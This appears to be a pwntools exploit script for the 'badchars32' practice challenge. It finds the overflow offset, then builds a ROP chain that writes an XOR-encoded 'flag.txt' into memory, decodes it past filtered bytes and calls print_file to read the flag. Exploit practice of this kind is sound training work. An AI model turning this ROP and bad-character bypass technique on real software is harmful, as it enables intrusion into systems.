import sys

from pwn import *
from rich import print

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# 0xf7fbb7ce <pwnme+273>             ret
gdbscript = '''
# break
b main
continue
b *0xf7fbb7ce
commands
hexdump $esp
# continue
end
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './badchars32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.eip, alphabet='bcdefhijk')
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset


# Pass in pattern_size, get back EIP offset
if False:
    offset = find_eip(cyclic(100, alphabet='bcdefhijk'))
    success(f"{offset=}")
    sys.exit()


offset=44


# binsh_offset = next(elf.search(b'/bin/cat'))

rop = ROP(elf)

# ➜  (venv)  write4_32 git:(master) ✗ readelf -S write432
  # [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
print(hex(elf.symbols.data_start))

# ➜  (venv)  badchars32 git:(master) ✗ ropper --nocolor -b 7867612e  --file ./badchars32 | fzf
# 0x080485b9: pop esi; pop edi; pop ebp; ret;
# 0x0804854f: mov dword ptr [edi], esi; ret;
# 0x080485bb: pop ebp; ret;
# 0x08048547: xor byte ptr [ebp], bl; ret;
# 0x0804839d: pop ebx; ret;
junk = 0xcafecafe
rop.raw([0x080485b9, xor('flag', 2), elf.symbols.data_start, junk])
rop.raw([0x0804854f])
rop.raw([0x080485b9, xor('.txt', 2), elf.symbols.data_start+4, junk])
rop.raw([0x0804854f])
rop.raw([0x0804839d, 2])
rop.raw([0x080485bb, elf.symbols.data_start])
rop.raw([0x08048547])
rop.raw([0x080485bb, elf.symbols.data_start+1])
rop.raw([0x08048547])
rop.raw([0x080485bb, elf.symbols.data_start+2])
rop.raw([0x08048547])
rop.raw([0x080485bb, elf.symbols.data_start+3])
rop.raw([0x08048547])
rop.raw([0x080485bb, elf.symbols.data_start+4])
rop.raw([0x08048547])
rop.raw([0x080485bb, elf.symbols.data_start+5])
rop.raw([0x08048547])
rop.raw([0x080485bb, elf.symbols.data_start+6])
rop.raw([0x08048547])
rop.raw([0x080485bb, elf.symbols.data_start+7])
rop.raw([0x08048547])

rop.print_file(elf.symbols.data_start)

PAYLOAD = flat({
    offset: [
        rop.chain(),
    ]
})
io = start()
io.sendlineafter(b'>', PAYLOAD)
io.clean()
# io.interactive()
# io.wait_for_close()